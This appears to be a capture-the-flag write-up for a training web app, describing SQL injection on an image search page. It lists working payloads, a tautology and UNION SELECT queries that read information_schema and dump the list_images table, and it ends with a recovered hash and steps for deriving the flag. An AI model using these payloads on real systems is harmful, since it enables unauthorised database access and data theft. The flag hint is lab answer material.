SQL injection on search image page

It's basically the same procedure as the sql_injection_member
Same steps:

- 1 OR 1=1
- -1 UNION SELECT table_name, column_name FROM information_schema.columns to get the list_images structure

and at last we concat the columns found
-1 UNION SELECT CONCAT(url, title, comment) as url, 1 from list_images

Url : borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
